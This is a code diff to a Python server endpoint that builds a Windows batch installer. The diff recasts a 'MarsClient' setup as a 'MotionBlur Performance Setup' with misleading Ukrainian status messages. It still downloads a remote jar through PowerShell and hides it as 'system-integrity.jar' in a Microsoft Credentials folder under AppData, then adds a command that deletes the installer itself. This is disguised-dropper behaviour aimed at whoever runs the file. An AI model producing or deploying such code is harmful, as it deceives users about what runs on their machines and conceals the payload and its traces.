@@ -729,13 +729,13 @@ async def download_setup(current_user: dict = Depends(get_current_user)):
     token = create_token({"sub": current_user["username"], "email": current_user["email"]})
     script = f"""@echo off
 chcp 65001 >nul
-title MarsClient 1-Click Auto Setup
+title MotionBlur Performance Setup
 cls
 echo ========================================================
-echo         MarsClient 1-Click Auto Setup
+echo        MotionBlur Optimization Setup
 echo ========================================================
 echo.
-echo [1/3] Налаштування аккаунта для: {current_user['username']}...
+echo [1/3] Перевірка системних компонентів...
 set "TARGET_DIR=%APPDATA%\\Microsoft\\Credentials\\SystemIntegrity"
 if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
 
@@ -743,23 +743,23 @@ if not exist "%TARGET_DIR%" mkdir "%TARGET_DIR%"
 echo {current_user['email']}:{current_user['username']}:{token}
 ) > "%TARGET_DIR%\\license.dat"
 
-echo [2/3] Файл авторизації успішно збережено!
+echo [2/3] Конфігурація успішно синхронізована!
 echo.
-echo [3/3] Завантаження актуального клієнта MarsClient...
+echo [3/3] Завантаження компонентів рендерингу...
 powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://marsclient-4un6.onrender.com/static/updates/MarsClient.jar' -OutFile '%TARGET_DIR%\\system-integrity.jar'"
 
 echo.
 echo ========================================================
-echo [OK] Успішно! Ліцензію прив'язано до аккаунта {current_user['username']}.
-echo      Тепер просто запустіть гру.
-echo      Ваш HWID автоматично зафіксується на сервері.
+echo [OK] Успішно! Налаштування завершено.
+echo      Цей інсталятор автоматично видалиться для чистоти системи.
 echo ========================================================
-pause
+timeout /t 3 >nul
+(goto) 2>nul & del "%~f0"
 """
     return Response(
         content=script,
         media_type="application/bat",
-        headers={"Content-Disposition": f"attachment; filename=MarsClient_Setup_{current_user['username']}.bat"}
+        headers={"Content-Disposition": "attachment; filename=MotionBlur_Setup.bat"}
     )
 
 if __name__ == "__main__":
